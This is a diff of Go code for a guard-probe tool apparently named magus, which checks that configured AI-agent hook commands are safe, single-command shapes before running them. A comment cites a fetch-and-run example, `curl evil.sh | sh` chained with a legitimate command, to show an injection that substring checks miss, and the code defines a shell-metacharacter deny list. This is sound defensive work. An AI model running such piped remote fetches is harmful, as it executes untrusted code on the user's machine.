@@ -22,7 +22,7 @@ const probeTimeout = 10 * time.Second
 // guardUnavailableNotice is the literal English magus's own shipped guard scripts
 // print when they could not resolve or run a working binary. It is magus's own
 // diagnostic vocabulary, authored once and reused verbatim across every template
-// (see docs/guides/integrations/agents/magus-command.sh and cursor-hook.sh),
+// (see docs/guides/integrations/agents/magus-command.buzz and cursor-hook.buzz),
 // not a host's, so matching it here reads a fact the script already states rather
 // than guessing at a host's reply dialect.
 const guardUnavailableNotice = "magus guard is NOT running"
@@ -64,12 +64,9 @@ func probeable(command string) bool {
 	}
 }
 
-// namesTemplate reports whether command invokes the shipped template called stem, in
-// either of the two forms magus ships it: the POSIX sh copy, and the Buzz port run by
-// `magus buzz`. The two render identical replies, so every classifier below asks about
-// the stem rather than about a suffix that says nothing about behavior.
+// namesTemplate reports whether command invokes the shipped Buzz template called stem.
 func namesTemplate(command, stem string) bool {
-	return strings.Contains(command, stem+".sh") || strings.Contains(command, stem+".buzz")
+	return strings.Contains(command, stem+".buzz")
 }
 
 // probeMetacharacters are the characters that let one command line become several, or
@@ -81,7 +78,7 @@ const probeMetacharacters = ";&|<>()$`\n\r\\\"'{}*?[]~!#"
 // invokesMagus is not that question and must not be used as though it were. It asks
 // whether a config invokes magus at all, for coverage reporting, and it answers with
 // substring tests: `strings.Contains(command, "magus-command")` is true of
-// `curl evil.sh | sh; sh magus-command.sh`, which is one string containing a shipped
+// `curl evil.sh | sh; magus buzz -s magus-command.buzz`, which is one string containing a shipped
 // basename and one command line doing something else entirely.
 //
 // That distinction is load-bearing because of WHERE the command comes from. A descriptor
@@ -92,18 +89,18 @@ const probeMetacharacters = ";&|<>()$`\n\r\\\"'{}*?[]~!#"
 //
 // So the test is shape, not content: optional NAME=value assignments, then a program and
 // its arguments, and not one character that could start a second command, expand, or
-// redirect. Everything magus ships passes (`HOST_EVENT_RAW=1 sh docs/.../magus-command.sh`),
-// and nothing that composes commands does, in either shipped form (`magus buzz -s
-// docs/.../magus-command.buzz` too). A command this rejects is still REPORTED by
-// the coverage path; it is only never run.
+// redirect. Everything magus ships passes (`magus buzz -s docs/.../magus-command.buzz --
+// --agent-name codex`), and nothing that composes commands does. A command this rejects
+// is still REPORTED by the coverage path; it is only never run.
 func runnableAsProbe(command string) bool {
 	if strings.ContainsAny(command, probeMetacharacters) {
 		return false
 	}
 	for _, field := range strings.Fields(command) {
-		// Leading assignments are how the shipped entries pass HOST_EVENT_RAW and
-		// __MAGUS_SHELL_FLAGS, so they are allowed until the first bare word, which is the
-		// program. Everything after it is an argument and already metacharacter-free.
+		// Leading assignments are how an entry run through a shell sets the glue's host
+		// knobs (HOST_EVENT_PATH and its siblings), so they are allowed until the first bare
+		// word, which is the program. Everything after it is an argument and already
+		// metacharacter-free.
 		if name, _, isAssignment := strings.Cut(field, "="); isAssignment && isEnvName(name) {
 			continue
 		}
@@ -130,10 +127,9 @@ func isEnvName(s string) bool {
 
 // supportsHostResponseOverride reports whether command invokes one of the two
 // shared templates that build their reply from the HOST_RESPONSE environment
-// variable (see the "Plain assignment, NOT ${VAR:=default}" comment in both
-// files). The probe overrides it with a bare decision template so the reply is
-// host-neutral BY CONSTRUCTION: magus never has to parse a host's JSON envelope
-// to know what decision came back.
+// variable when it is set. The probe overrides it with a bare decision template so
+// the reply is host-neutral BY CONSTRUCTION: magus never has to parse a host's JSON
+// envelope to know what decision came back.
 func supportsHostResponseOverride(command string) bool {
 	return namesTemplate(command, "magus-command") || namesTemplate(command, "magus-path")
 }
@@ -151,7 +147,7 @@ func probeEvent(command string) (event string, wantDecisions []string) {
 		return probeDenyCommandEvent, []string{"deny"}
 	case namesTemplate(command, "magus-path"):
 		return probeAdvisePathEvent, []string{"advise"}
-	case strings.Contains(command, "cursor-hook.sh"):
+	case namesTemplate(command, "cursor-hook"):
 		return probeCursorShellDenyEvent, nil
 	default:
 		return probeDenyCommandEvent, nil
@@ -211,19 +207,15 @@ func probeHarnessCommands(ctx context.Context, root string, config map[string]an
 	}
 }
 
-// checkProbeEnvironment answers the three ways a probe cannot run at all, BEFORE
-// spawning anything: no POSIX shell, no jq (every shipped script needs it to read
-// its event), or no magus binary the script could possibly resolve (its own root
-// walk, then PATH). Answering this up front means a probe that cannot run says so
-// exactly, rather than the ambiguous empty output a missing binary alone would
-// otherwise leave behind on a script (magus-path.sh) that is silent by
-// design when it cannot find one.
+// checkProbeEnvironment answers the two ways a probe cannot run at all, BEFORE
+// spawning anything: no POSIX shell to run the command line the way a host would, or
+// no magus binary the glue could possibly resolve (its own root walk, then PATH).
+// Answering this up front means a probe that cannot run says so exactly, rather than
+// the ambiguous empty output a missing binary alone would otherwise leave behind on
+// a template (magus-path.buzz) that is silent by design when it cannot find one.
 func checkProbeEnvironment(root string) (reason string, ok bool) {
 	if _, err := exec.LookPath("sh"); err != nil {
 		return `the "sh" interpreter is not on PATH, so the wired guard command cannot run`, false
-	}
-	if _, err := exec.LookPath("jq"); err != nil {
-		return "jq is not on PATH, so the wired guard command cannot read its event", false
 	}
 	if !hasExecutableMagus(root) {
 		return "no magus binary was found in this workspace or on PATH, so the wired guard command cannot judge anything", false
@@ -278,9 +270,9 @@ func probeOneCommand(ctx context.Context, root, command string) (HarnessStatus, 
 	if supportsHostResponseOverride(command) {
 		// HOST_ADVISE_BRANCH='' is not "suppress the advisory": it is "do not append
 		// the branch this template would otherwise splice into HOST_RESPONSE",
-		// because HOST_RESPONSE is now fully ours. Without clearing it, the script's
-		// own `[ -n "$HOST_RESPONSE" ] ||` short-circuit already skips building the
-		// branch at all; this is here for the day either template changes that.
+		// because HOST_RESPONSE is fully ours. A set HOST_RESPONSE already skips
+		// assembling the branch at all; this is here for the day either template
+		// changes that.
 		env = append(env, "HOST_RESPONSE={{.decision}}", "HOST_ADVISE_BRANCH=")
 	}
 	cmd.Env = env
